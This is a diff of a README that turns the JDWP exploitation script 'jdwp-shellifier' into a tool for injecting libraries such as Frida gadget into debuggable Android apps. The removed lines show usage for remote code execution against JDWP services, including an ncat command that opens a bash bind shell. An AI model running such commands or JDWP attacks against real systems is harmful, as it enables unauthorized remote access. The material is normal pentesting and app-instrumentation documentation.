@@ -1,44 +1,20 @@
-# JDWP exploitation script
+# JDWP library injector script
 
 ## What is it ?
-This exploitation script is meant to be used by pentesters against active JDWP service, in order to gain Remote Code Execution.
+This script can be used to inject native shared libraries into debuggable Android applications.
+It was mainly developed for injecting the Frida gadget library on non-rooted devices.
 
-## How does it work ?
-Well, in a pretty standard way, the script only requires a Python 2 interpreter:
+## How does it work?
 
-	% python ./jdwp-shellifier.py -h
-	usage: jdwp-shellifier.py [-h] -t IP [-p PORT] [--break-on JAVA_METHOD]
-                          [--cmd COMMAND]
+The script can inject any library, however in this example we will be injecting Frida gadget.
 
-    Universal exploitation script for JDWP by @_hugsy_
+1. Download the correct gadget for your architecture (arm/arm64/x86/x86_64) from https://github.com/frida/frida/releases/
+2. On your device go to Developer options, "Select debug app" and select the desired application.
+2. In the same screen, enable the "Wait for debugger" option
+3. Start the application you want to inject the library into - this will pause waiting for a debugger to be connected.
+4. On your shell, run `./jdwp-lib-injector.sh frida-gadget-10.1.5-android-arm64.so` or similar.
 
-    optional arguments:
-    -h, --help            show this help message and exit
-    -t IP, --target IP    Remote target IP (default: None)
-    -p PORT, --port PORT  Remote target port (default: 8000)
-    --break-on JAVA_METHOD
-    Specify full path to method to break on (default:
-    	java.net.ServerSocket.accept)
-    	--cmd COMMAND         Specify full path to method to break on (default:
-    		None)
+For more information, please visit https://koz.io/library-injection-for-debuggable-android-apps/
 
-To target a specific host/port:
-
-	$ python ./jdwp-shellifier.py -t my.target.ip -p 1234
-	
-This command will only inject Java code on the JVM and show some info like Operating System, Java version. Since it does not execute external code/binary, it is totally safe and can be used as Proof-Of-Concept
-
-	$ python ./jdwp-shellifier.py -t my.target.ip -p 1234 --cmd "ncat -v -l -p 1234 -e /bin/bash"
-	
-This command will actually execute the process `ncat` with the specified argument with the rights given to the running JVM.
-
-Before sending questions, make sure to read http://blog.ioactive.com/2014/04/hacking-java-debug-wire-protocol-or-how.html for full understanding of the JDWP protocol. 
-
-## Thanks
-* Ilja Van Sprundel
-* Sebastien Macke
-
-
-
-
-
+## Development
+This script is based on [jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier) by @\_hugsy\_, modified to facilitate library loading. The original README of jdwp-shellifier is at README-shellifier.md. Also included: a simple orchestration shell script to be used by end users. 
